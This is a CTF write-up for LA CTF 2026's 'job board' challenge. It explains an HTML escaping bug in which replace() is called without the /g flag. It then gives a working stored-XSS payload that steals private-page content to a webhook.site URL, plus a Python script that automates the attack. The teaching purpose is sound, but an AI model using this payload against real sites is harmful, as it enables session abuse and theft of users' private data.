---
title: "[Web] job board"
description: Writeup for "job board" from LA CTF 2026.
date: 2026-02-10 01:00:00 +0900
categories: [CTF, LA CTF 2026]
tags: [Web]
toc: true
comments: false
render_with_liquid: false
---

## TL;DR

The application page renders user input (`why`) as HTML using a broken `htmlEscape()` function — it calls `replace()` **without the `/g` flag**, so each special character is only escaped **once**.

By putting `&<>` at the start of the input (to "use up" the one-time escaping), we can inject a `<script>` tag right after — **Stored XSS**.

The Admin Recruiter bot visits the application URL while logged in as admin. Our script runs in the admin's browser, fetches all job listings (including private ones), finds the flag, and sends it to our webhook.

---

## Overview

| Role | What they can see |
|---|---|
| Normal user | Public jobs only |
| Admin Recruiter | Public + private jobs |

The flag is in the **description of a private job**.
The bot visits any application URL we send — so if we store XSS in an application, it runs as admin.

---

## Root Cause

```js
function htmlEscape(s, quote=true) {
  s = s.replace("&", "&amp;");  // only replaces the FIRST "&"
  s = s.replace("<", "&lt;");   // only replaces the FIRST "<"
  s = s.replace(">", "&gt;");   // only replaces the FIRST ">"
  ...
}
```

`String.replace()` without `/g` only replaces the **first match**.
So if we put `&<>` at the beginning of our input, those characters get escaped — but any `<` or `>` that comes after them is left **untouched**.

This means we can inject raw HTML tags after the bait characters.

---

## Exploit

### Attack flow

1. Submit an application with a stored XSS payload in the `why` field.
2. Send the application URL to the Admin Recruiter bot.
3. Bot visits the page as admin → our script runs.
4. Script fetches `/` to get all job links (including private ones).
5. Script fetches each job page and searches for `lactf{...}`.
6. Flag is sent to our webhook via `new Image().src`.

### Payload (put in the `why` field)

Replace the webhook URL with your own from [webhook.site](https://webhook.site).

```html
&<> <script>(async()=>{
  const home = await (await fetch(`/`)).text();
  const links = home.match(/\/job\/[0-9a-f-]{36}/g) || [];
  for (const u of links){
    const t = await (await fetch(u)).text();
    const m = t.match(/lactf\{[^}]+\}/);
    if(m){
      (new Image()).src = `https://webhook.site/YOUR-ID?f=${encodeURIComponent(m[0])}`;
      break;
    }
  }
})();</script>
```

**Key points:**
- `&<>` at the start consumes the one-time escaping for `&`, `<`, `>`
- The `<script>` tag after it is left unescaped → XSS works
- Backticks (`` ` ``) are used in JS strings to avoid triggering `'`/`"` escaping
- `new Image().src` is used for exfil instead of `location` — more reliable in headless bot environments

---

## Flag

```
lactf{c0ngr4ts_0n_y0ur_n3w_l7fe}
```

---

## solve.py

This script creates the application with the XSS payload and prints the URL to submit to the bot.

```python
#!/usr/bin/env python3
import argparse, re, sys
from urllib.parse import urljoin
import requests

UUID36 = r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"

def build_payload(webhook: str) -> str:
    return (
        "&<> <script>(async()=>{"
        "  const home = await (await fetch(`/`)).text();"
        "  const links = home.match(/\\/job\\/[0-9a-f-]{36}/g) || [];"
        "  for (const u of links){"
        "    const t = await (await fetch(u)).text();"
        "    const m = t.match(/lactf\\{[^}]+\\}/);"
        "    if(m){"
        f"      (new Image()).src = `{webhook}?f=${{encodeURIComponent(m[0])}}`;"
        "      break;"
        "    }"
        "  }"
        "})();</script>"
    )

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="e.g. https://job-board.chall.lac.tf/")
    ap.add_argument("--webhook", required=True, help="e.g. https://webhook.site/<uuid>")
    ap.add_argument("--name", default="test")
    ap.add_argument("--email", default="test@test.com")
    args = ap.parse_args()

    base = args.base.rstrip("/") + "/"
    s = requests.Session()

    # Find a job ID from the index page
    r = s.get(base, timeout=15)
    r.raise_for_status()
    m = re.search(rf"/job/({UUID36})", r.text)
    if not m:
        sys.exit("[!] No job found on index page")
    job_id = m.group(1)

    # Submit application with XSS payload
    r = s.post(urljoin(base, f"/application/{job_id}"),
               data={"name": args.name, "email": args.email, "why": build_payload(args.webhook)},
               timeout=15)
    r.raise_for_status()

    m = re.search(rf"(/application/{UUID36})", r.text)
    if not m:
        sys.exit("[!] Could not find application URL in response")

    app_url = urljoin(base, m.group(1))
    print(f"[+] Application URL: {app_url}")
    print("[*] Submit this URL to the Admin Recruiter bot, then check your webhook.")

if __name__ == "__main__":
    main()
```

**Usage:**
```bash
python3 solve.py --base "https://job-board.chall.lac.tf/" --webhook "https://webhook.site/YOUR-ID"
```

---

## Notes

The bug is a **classic one-shot escape** mistake — using `replace()` without `/g` in JavaScript only fixes the first occurrence. Always use `.replace(/regex/g, ...)` or a proper sanitization library when escaping user input for HTML.
